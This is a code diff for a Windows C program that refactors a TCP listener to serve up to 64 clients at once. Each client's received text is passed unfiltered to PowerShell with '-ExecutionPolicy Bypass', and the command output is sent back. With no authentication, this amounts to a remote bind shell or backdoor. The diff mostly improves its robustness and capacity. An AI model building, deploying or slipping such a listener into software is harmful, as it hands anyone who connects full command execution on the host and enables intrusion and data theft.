@@ -7,6 +7,8 @@
 #include <ws2tcpip.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <mstcpip.h>
+#define MAX_CLIENTS 64
 
 // Need to link with Ws2_32.lib
 #pragma comment (lib, "Ws2_32.lib")
@@ -18,35 +20,19 @@
 char    *CommandCpy(char *recvbuf)
 {
     char    *pwshell = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ";
-    char    *cmd = malloc(sizeof(char) * strlen(pwshell) + strlen(recvbuf) + 3);
-    strcpy(cmd, pwshell);
-    strcat(cmd, "\"");
-    strcat(cmd, recvbuf);
-    strcat(cmd, "\"");
+    size_t  len = strlen(pwshell) + strlen(recvbuf) + 3;
+    char    *cmd = malloc(sizeof(char) * len);
+
+    snprintf(cmd, len, "%s\"%s\"", pwshell, recvbuf);
+    printf("cmd: %s\n", cmd);
     return (cmd);
 }
 
-int __cdecl main(void) 
+int  init_socket(SOCKET *ListenSocket)
 {
-    WSADATA wsaData;
-    int iResult;
-
-    SOCKET ListenSocket = INVALID_SOCKET;
-    SOCKET ClientSocket = INVALID_SOCKET;
-
+    int iResult = 0;
     struct addrinfo *result = NULL;
     struct addrinfo hints;
-
-    int iSendResult;
-    char recvbuf[DEFAULT_BUFLEN];
-    int recvbuflen = DEFAULT_BUFLEN;
-    
-    // Initialize Winsock
-    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-    if (iResult != 0) {
-        printf("WSAStartup failed with error: %d\n", iResult);
-        return (1);
-    }
 
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_INET;
@@ -54,128 +40,149 @@ int __cdecl main(void)
     hints.ai_protocol = IPPROTO_TCP;
     hints.ai_flags = AI_PASSIVE;
 
-    // Resolve the server address and port
     iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
     if (iResult != 0 )
     {
-        printf("getaddrinfo failed with error: %d\n", iResult);
         WSACleanup();
-        return 1;
+        return (-10);
     }
 
-    // Create a SOCKET for the server to listen for client connections.
-    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-    if (ListenSocket == INVALID_SOCKET)
+    *ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+    if (*ListenSocket == INVALID_SOCKET)
     {
-        printf("socket failed with error: %ld\n", WSAGetLastError());
         freeaddrinfo(result);
         WSACleanup();
-        return 1;
+        return (-10);
     }
-
-    // Setup the TCP listening socket
-    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
+    iResult = bind(*ListenSocket, result->ai_addr, (int)result->ai_addrlen);
     if (iResult == SOCKET_ERROR)
     {
-        printf("bind failed with error: %d\n", WSAGetLastError());
         freeaddrinfo(result);
-        closesocket(ListenSocket);
+        closesocket(*ListenSocket);
         WSACleanup();
-        return 1;
+        return (-10);
     }
     freeaddrinfo(result);
-
-    iResult = listen(ListenSocket, SOMAXCONN);
+    iResult = listen(*ListenSocket, SOMAXCONN);
     if (iResult == SOCKET_ERROR)
     {
-        printf("listen failed with error: %d\n", WSAGetLastError());
-        closesocket(ListenSocket);
+        closesocket(*ListenSocket);
         WSACleanup();
-        return 1;
+        return (-10);
     }
+    return (iResult);
+}
 
-    // Accept a client socket
+int __cdecl main(void) 
+{
+    WSADATA wsaData;
+    SOCKET  ListenSocket = INVALID_SOCKET;
+    SOCKET  clients[MAX_CLIENTS];
 
-    // No longer need server socket
+    int     i = 0;
+    int     iResult = 0;
+
+    fd_set          readfds;
+    struct timeval  timeout;
+
+    // Initialize Winsock
+    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (iResult != 0)
+        return (1);
+    iResult = init_socket(&ListenSocket);
+    if (iResult == -10)
+        return (1);
+
+    for (i = 0; i < MAX_CLIENTS; i++)
+        clients[i] = INVALID_SOCKET;
 
     // Receive until the peer shuts down the connection
     while(1)
     {
-            ClientSocket = accept(ListenSocket, NULL, NULL);
-            if (ClientSocket == INVALID_SOCKET)
+            FD_ZERO(&readfds);
+            FD_SET(ListenSocket, &readfds);
+
+            for (i = 0; i < MAX_CLIENTS; i++)
             {
-                printf("accept failed with error: %d\n", WSAGetLastError());
-                //closesocket(ListenSocket);
-                //WSACleanup();
-                Sleep(100);
-                continue ;
+                if (clients[i] != INVALID_SOCKET)
+                    FD_SET(clients[i], &readfds);
             }
-        //closesocket(ListenSocket);
-
-        while (1)
-        {
-            iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-            if (iResult > 0)
+        
+            timeout.tv_sec = 30;
+            timeout.tv_usec = 0;
+        
+            int activity = select(0, &readfds, NULL, NULL, &timeout);
+        
+            if (activity == SOCKET_ERROR)
+                break;
+            if (FD_ISSET(ListenSocket, &readfds))
             {
-                printf("Bytes received: %d\n", iResult);
-
-                char    psBuffer[4096];
-                FILE    *pPipe;
-                char    *cmd = CommandCpy(recvbuf);
-
-                if ((pPipe = _popen(cmd, "r")) == NULL)
-                    exit(1);
-                free(cmd);
-                char output[4096] = {0};
-
-                while (fgets(psBuffer, sizeof(psBuffer), pPipe))
-                    strcat(output, psBuffer);
-
-                int endOfFileVal = feof(pPipe);
-                int closeReturnVal = _pclose(pPipe);
-
-                if (endOfFileVal)
-                    printf("\nProcess returned %d\n", closeReturnVal);
-                else
-                    printf("Error: Failed to read the pipe to the end.\n");
-
-                strcat(output, "\n");
-                // Echo the buffer back to the sender
-                iSendResult = send( ClientSocket, output, strlen(output), 0 );
-                if (iSendResult == SOCKET_ERROR) {
-                    printf("send failed with error: %d\n", WSAGetLastError());
-                    //closesocket(ClientSocket);
-                    //WSACleanup();
-                    return 1;
+                SOCKET newSocket = accept(ListenSocket, NULL, NULL);
+                if (newSocket != INVALID_SOCKET)
+                {
+                    for (i = 0; i < MAX_CLIENTS; i++)
+                    {
+                        if (clients[i] == INVALID_SOCKET)
+                        {
+                            clients[i] = newSocket;
+                            printf("New client: %d\n", newSocket);
+                            break ;
+                        }
+                    }
                 }
-                printf("Bytes sent: %d\n", iSendResult);
-            }
-            else if (iResult == 0) {
-                printf("Connection closing...\n");
-                break ; 
-            }
-            else  {
-                printf("recv failed with error: %d\n", WSAGetLastError());
-                //closesocket(ClientSocket);
-                //WSACleanup();
-                break ;
+
             }
 
+        for (i = 0; i < MAX_CLIENTS; i++)
+        {
+            SOCKET s = clients[i];
+            if (s != INVALID_SOCKET && FD_ISSET(s, &readfds))
+            {
+                char recvbuf[DEFAULT_BUFLEN];
+                int ret = recv(s, recvbuf, sizeof(recvbuf) - 1, 0);
+
+                if (ret <= 0)
+                {
+                    printf("Client disconnected\n");
+                    closesocket(s);
+                    clients[i] = INVALID_SOCKET;
+                    continue;
+                }
+
+                recvbuf[ret] = 0;
+
+                char *cmd = CommandCpy(recvbuf);
+                FILE *pPipe = _popen(cmd, "r");
+                free(cmd);
+
+                char output[4096] = {0};
+                char psBuffer[512];
+
+                if (pPipe)
+                {
+                    while (fgets(psBuffer, sizeof(psBuffer), pPipe))
+                    {
+                        size_t len = strlen(output); // longueur actuelle
+                        if (len < sizeof(output))
+                        {
+                            snprintf(
+                                output + len,          // écrire à la fin
+                                sizeof(output) - len,  // espace restant
+                                "%s",                  // format littéral
+                                psBuffer
+                            );
+                        }
+                        else
+                        {
+                            break; // buffer plein
+                        }
+                    }
+
+                }
+
+                send(s, output, (int)strlen(output), 0);
+            }
         }
     }
-
-    // shutdown the connection since we're done
-    iResult = shutdown(ClientSocket, SD_SEND);
-    if (iResult == SOCKET_ERROR) {
-        printf("shutdown failed with error: %d\n", WSAGetLastError());
-        closesocket(ClientSocket);
-        WSACleanup();
-        return 1;
-    }
-
-    // cleanup
-    closesocket(ClientSocket);
-    WSACleanup();
-
-    return 0;
+    return (0);
 }
